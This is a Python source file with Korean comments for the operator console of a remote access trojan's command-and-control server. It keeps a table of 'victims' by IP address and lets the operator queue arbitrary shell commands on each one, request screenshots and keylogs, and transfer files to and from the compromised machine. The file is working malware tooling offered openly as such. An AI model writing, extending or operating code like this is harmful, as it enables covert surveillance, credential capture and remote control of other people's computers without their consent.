import cmd
import os
import logging

from setting import *
from mixin import SEQFileMixin

logger = logging.getLogger(LOGGER_NAME)

class BaseShell(cmd.Cmd):
    prompt = '> '

    def __init__(self, completekey='tab', stdin=None, stdout=None):
        super().__init__(completekey, stdin, stdout)

    # 빈 명령에 대한 처리
    def emptyline(self):
        pass

    # 명령어 오류 출력
    def default(self, line: str) -> None:
        return super().default(line)
    
    # 로그 출력
    def _print_log(self, count=100):
        with open(logger.handlers[0].baseFilename, 'r', encoding=ENCODING) as fr:
            log_data = fr.readlines()
        
        if not log_data:
            print('None')
            return

        start_index = (len(log_data) - count) if (len(log_data) - count) > 0 else 0

        log_data = log_data[start_index:]

        for data in log_data:
            print(data, end='')

    # argument parsing
    def _parsing_argu(self, arg : str):
        if not arg or arg == '':
            return None, 0

        args = arg.split(' ')
        
        return args, len(args)

    # exit
    def do_exit(self, arg):
        '''exit shell'''
        return True
        
    def do_show(self, arg):
        parsed_arg, count = self._parsing_argu(arg)

        if count < 1:
            self.default('show ' + arg)
            return True

        if parsed_arg[0] == 'log':
            try:
                count = 100 if len(parsed_arg) < 2 else int(parsed_arg[1])
                self._print_log(count)
                return
            except Exception as e:
                self.default('show ' + arg)
            
            return True
        else:
            return parsed_arg

    

class EntryShell(BaseShell):
    def __init__(self, victims_table : dict, completekey='tab', stdin=None, stdout=None):
        super().__init__(completekey, stdin, stdout)
        self.victims_table = victims_table

    def _get_ip_by_index(self, index) -> list:
        for key, value in zip(self.victims_table.keys(), self.victims_table.values()):
            if index == value['index']:
                return key
        return False

    def do_show(self, arg):
        parsed_arg = super().do_show(arg)

        if isinstance(parsed_arg, list):
            if parsed_arg[0] == 'victim':
                print('|%10s|%20s|%40s|' % ('index', 'ip', 'cmd queue'))
                print('-'*84)
                for ip in self.victims_table.keys():
                    print('|%10s|%20s|%40s|' % (self.victims_table[ip]['index'], ip, list(self.victims_table[ip]['command'])))

                return
            else:
                self.default('show ' + arg)

    def do_use(self, arg):
        if arg:
            ip = self._get_ip_by_index(arg)
            if ip:
                try:
                    victim_shell = VictimShell(victim_ip=ip, victim_table=self.victims_table[ip])
                    victim_shell.cmdloop()
                except KeyboardInterrupt:
                    self.stdout.write('\n')
                    return
            else:
                self.stdout.write("Invalid index '{}'\n".format(arg))
                return
        
        self.default('use ' + arg)

    # TODO set 명령어 구현 (별칭 붙이기)
    # TODO clear 명령어 구현 (log 등등 지워주기)

class VictimShell(BaseShell, SEQFileMixin):
    def __init__(self, victim_ip : str, victim_table : dict, completekey='tab', stdin=None, stdout=None):
        super().__init__(completekey, stdin, stdout)
        self.prompt = '{0}({1}) > '.format(victim_table['index'], victim_ip)
        self.victim_ip = victim_ip
        self.victim_table = victim_table

    def do_sh(self, arg):
        if arg:
            self.victim_table['command'].append(arg)
            return
        
        self.default('sh')


    def do_show(self, arg):
        parsed_arg = super().do_show(arg)

        if isinstance(parsed_arg, list):
            if parsed_arg[0] == 'status':
                print(self.victim_table)
                return

            else:
                self.default('show ' + arg)
        


    def do_get(self, arg):
        parsed_arg, arg_len = self._parsing_argu(arg)
        
        if isinstance(parsed_arg, list) and arg_len > 0:
            # 피해자 화면 캡처
            if parsed_arg[0] == 'screenshot':
                self.victim_table['command'].append('[screenshot]')
                return
            # 피해자 키로그
            elif parsed_arg[0] == 'keylog':
                self.victim_table['command'].append('[keylog]')
                return
            elif parsed_arg[0] == 'file':
                parsed_arg = parsed_arg[1:]
                last_argu = parsed_arg[-1]

                if '\\' in last_argu:
                    last_argu = parsed_arg[-1].split('\\')[-1]

                if os.path.isfile(FILE_PATH + last_argu):
                    self.stdout.write('{} is already exit in FILE_PATH\n'.format(last_argu))
                    logger.error('{} is already exit in FILE_PATH'.format(last_argu))
                    return
                
                # 레이스 컨디션 방지 
                with open(FILE_PATH+last_argu, 'wb'):
                    pass

                self.victim_table['command'].append('[get file {}]'.format(" ".join(parsed_arg)))
                return
        
        self.default('get ' + arg)

    
    def do_send(self, arg):
        if self.victim_table['sending_file'] != "":
            self.stdout.write("Already sending\n")
            return;


        parsed_arg, arg_len = self._parsing_argu(arg)

        if arg_len != 3:
            self.stdout.write('usage : send (file) [target] [save path & name]\n')
            return
            
        if parsed_arg[0] == 'file':
            # race condition 방지
            if not os.path.isfile(parsed_arg[1]):
                print('There is no file in {}'.format(parsed_arg[1]))
                return

            self.victim_table['command'].append('[send file {}]'.format(parsed_arg[-1]))

            filePath = parsed_arg[1]

            if '\\' in filePath:
                filePath = filePath.split('\\')[-1]
            if '/' in filePath:
                filePath = filePath.split('/')[-1]
            if '.' in filePath:
                filePath = filePath.split('.')[0]

            self.victim_table['sending_file'] = filePath
            self._split_sending_file(parsed_arg[1], self.victim_ip)
            
            return